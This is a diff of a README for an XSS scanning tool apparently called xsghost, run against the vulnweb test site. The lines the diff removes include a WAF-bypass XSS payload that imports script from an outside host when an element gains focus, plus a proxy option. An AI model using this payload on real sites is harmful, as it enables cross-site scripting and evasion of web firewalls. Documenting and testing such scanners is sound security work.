@@ -30,17 +30,6 @@ go install -v github.com/eikehacker1/xsghost@latest
 ./xsghost.exe testphp.vulnweb.com  -only-poc 
 ```
 
-###  Bypass Payload in AWS, Iperva, Cloudflare and Akamai.
-
-```
-./xsghost.exe testphp.vulnweb.com  -only-poc -payload "<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>"
-```
-### Proxy bypass
-
-```
-./xsghost.exe testphp.vulnweb.com  -only-poc -proxy "http://proxy:8080" 
-```
-
 ### -h func
 
 ```
